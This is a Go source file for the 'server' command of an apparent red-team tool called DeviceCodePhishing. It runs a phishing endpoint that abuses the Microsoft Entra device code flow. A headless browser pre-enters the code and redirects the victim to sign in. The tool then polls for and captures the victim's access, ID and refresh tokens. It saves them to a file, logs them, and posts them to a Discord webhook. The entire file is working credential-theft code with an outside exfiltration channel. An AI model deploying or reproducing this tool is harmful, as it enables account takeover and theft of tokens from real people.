package cmd

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
	"github.com/spf13/cobra"
	"io"
	"log"
	"log/slog"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const MsAuthenticationBroker string = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
const DefaultTenant string = "common"

var (
	address        string
	userAgent      string
	clientId       string
	tenant         string
	certFile       string
	keyFile        string
	lurePath       string
	discordWebhook string
)

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&address, "address", "a", "0.0.0.0:443", "Server listening address and port (e.g., 0.0.0.0:443)")
	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", EdgeOnWindows, "User-Agent string for HeadlessBrowser & API calls")
	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "Azure/Microsoft Entra Client ID for requesting tokens")
	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Azure/Microsoft Entra tenant (use 'common' for multi-tenant)")
	runCmd.Flags().StringVar(&certFile, "cert", "", "Path to TLS certificate file for HTTPS")
	runCmd.Flags().StringVar(&keyFile, "key", "", "Path to TLS private key file for HTTPS")
	runCmd.Flags().StringVarP(&lurePath, "lure-path", "l", "/lure", "URL path for the phishing endpoint")
	runCmd.Flags().StringVar(&discordWebhook, "discord-webhook", "", "Discord webhook URL for real-time token notifications")
}

var runCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts the phishing server",
	Long: `Starts the phishing server that captures device code tokens.
	
Default Configuration:
- Listens on all interfaces (0.0.0.0) port 443
- Uses Microsoft Authentication Broker client ID
- Stores tokens in ./tokens/tokens.txt
- Logs important events to stdout`,
	Run: func(cmd *cobra.Command, args []string) {
		// Set up logging with clean default configuration
		logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelInfo}))
		slog.SetDefault(logger)

		// Create tokens directory and file
		tokensDir := "tokens"
		if err := os.MkdirAll(tokensDir, 0750); err != nil {
			slog.Error("Failed to create tokens directory:", err)
			os.Exit(1)
		}

		// Create tokens.txt if it doesn't exist
		tokensFile := filepath.Join(tokensDir, "tokens.txt")
		if _, err := os.Stat(tokensFile); os.IsNotExist(err) {
			f, err := os.OpenFile(tokensFile, os.O_CREATE|os.O_WRONLY, 0640)
			if err != nil {
				slog.Error("Failed to create tokens file:", err)
				os.Exit(1)
			}
			f.Close()
			slog.Info("Created tokens file:", tokensFile)
		}

		// Ensure lurePath starts with /
		if !strings.HasPrefix(lurePath, "/") {
			lurePath = "/" + lurePath
		}

		// Set up a resource handler
		mux := http.NewServeMux()
		mux.HandleFunc(lurePath, lureHandler)
		
		// Add a catch-all handler to prevent access to files
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != lurePath {
				http.Error(w, "Not Found", http.StatusNotFound)
				return
			}
		})

		// Create a Server instance
		server := &http.Server{
			Addr:    address,
			Handler: mux,
		}

		slog.Info("Start Server using Tenant:" + tenant + " ClientId:" + clientId)
		
		// Create an IPv4 listener
		ln, err := net.Listen("tcp4", address)
		if err != nil {
			log.Fatal(err)
		}
		
		// Check if TLS certificates are provided
		if certFile != "" && keyFile != "" {
			slog.Info(fmt.Sprintf("Server listening with TLS on %s%s", getListeningURL(address, true), lurePath))
			log.Fatal(server.ServeTLS(ln, certFile, keyFile))
		} else {
			slog.Info(fmt.Sprintf("Server listening on %s%s", getListeningURL(address, false), lurePath))
			slog.Warn("Running without TLS! For HTTPS, provide --cert and --key flags")
			log.Fatal(server.Serve(ln))
		}
	},
}

// getListeningURL returns the full URL based on the address
func getListeningURL(addr string, isTLS bool) string {
	protocol := "http://"
	if isTLS {
		protocol = "https://"
	}
	
	// If address starts with :, it means all interfaces
	if addr[0] == ':' {
		return protocol + "*" + addr
	}
	return protocol + addr
}

func lureHandler(w http.ResponseWriter, r *http.Request) {
	slog.Info("Lure opened...")

	http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)

	scopes := []string{"openid", "profile", "offline_access"}
	deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
	if err != nil {
		slog.Error("Error during starting device code flow:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent)
	if err != nil {
		slog.Error("Error during headless browser automation:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	go startPollForToken(tenant, clientId, deviceAuth)
	http.Redirect(w, r, redirectUri, http.StatusFound)
}

func writeTokenToFile(userCode string, tokenType string, token string) error {
	tokensFile := filepath.Join("tokens", "tokens.txt")
	timestamp := time.Now().UTC().Format(time.RFC3339Nano)
	
	// Format the token details
	tokenDetails := fmt.Sprintf("=== %s ===\nUser Code: %s\nToken Length: %d\nToken: %s\nTimestamp: %s\n", 
		tokenType, userCode, len(token), token, timestamp)

	// Try to write to file
	f, err := os.OpenFile(tokensFile, os.O_APPEND|os.O_WRONLY, 0640)
	if err != nil {
		slog.Error("Failed to open tokens file:", err)
		return err
	}
	defer f.Close()
	
	if _, err := f.WriteString(tokenDetails + "\n"); err != nil {
		slog.Error("Failed to write to tokens file:", err)
		return err
	}

	return nil
}

func sendDiscordMessage(message string) {
	if discordWebhook == "" {
		slog.Error("Discord webhook URL is empty")
		return
	}

	// Calculate max content length to stay within Discord's limit
	maxContentLength := 1900 // Leave room for code block markers and formatting

	// Split message into chunks if needed
	messageRunes := []rune(message)
	for i := 0; i < len(messageRunes); i += maxContentLength {
		end := i + maxContentLength
		if end > len(messageRunes) {
			end = len(messageRunes)
		}
		
		chunk := string(messageRunes[i:end])
		payload := map[string]string{
			"content": fmt.Sprintf("```\n%s\n```", chunk),
		}
		
		jsonData, err := json.Marshal(payload)
		if err != nil {
			slog.Error("Failed to marshal Discord payload:", err)
			continue
		}

		slog.Info("Sending message chunk to Discord...")
		resp, err := http.Post(discordWebhook, "application/json", bytes.NewBuffer(jsonData))
		if err != nil {
			slog.Error("Failed to send to Discord webhook:", err)
			continue
		}
		
		if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent {
			body, _ := io.ReadAll(resp.Body)
			slog.Error(fmt.Sprintf("Discord webhook error - Status: %d, Response: %s", resp.StatusCode, string(body)))
		}
		resp.Body.Close()
		
		// Add a small delay between chunks to avoid rate limiting
		time.Sleep(500 * time.Millisecond)
	}
}

func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth) {
	pollInterval := time.Duration(deviceAuth.Interval) * time.Second
	slog.Info("Started polling for token: " + deviceAuth.UserCode)

	for {
		time.Sleep(pollInterval)
		result, err := entra.RequestToken(tenant, clientId, deviceAuth)

		if err != nil {
			slog.Error(fmt.Sprintf("Error polling for token: %v", err))
			return
		}

		if result != nil {
			// Write tokens to file first
			if err := writeTokenToFile(deviceAuth.UserCode, "AccessToken", result.AccessToken); err != nil {
				slog.Error("Failed to write access token to file:", err)
			}
			if err := writeTokenToFile(deviceAuth.UserCode, "IdToken", result.IdToken); err != nil {
				slog.Error("Failed to write ID token to file:", err)
			}
			if err := writeTokenToFile(deviceAuth.UserCode, "RefreshToken", result.RefreshToken); err != nil {
				slog.Error("Failed to write refresh token to file:", err)
			}

			// Send tokens to Discord separately
			if discordWebhook != "" {
				slog.Info("Sending tokens to Discord...")
				
				// Send each token separately with a clear label including the user code
				sendDiscordMessage(fmt.Sprintf("=== AccessToken for %s ===\n%s", deviceAuth.UserCode, result.AccessToken))
				time.Sleep(1 * time.Second) // Delay between messages
				
				sendDiscordMessage(fmt.Sprintf("=== IdToken for %s ===\n%s", deviceAuth.UserCode, result.IdToken))
				time.Sleep(1 * time.Second)
				
				sendDiscordMessage(fmt.Sprintf("=== RefreshToken for %s ===\n%s", deviceAuth.UserCode, result.RefreshToken))
			} else {
				slog.Warn("Discord webhook URL is not set")
			}

			// Log tokens to console
			slog.Info(fmt.Sprintf("AccessToken: %s", result.AccessToken))
			slog.Info(fmt.Sprintf("IdToken: %s", result.IdToken))
			slog.Info(fmt.Sprintf("RefreshToken: %s", result.RefreshToken))
			
			return
		}
		slog.Info("Checking for token: " + deviceAuth.UserCode)
	}
}
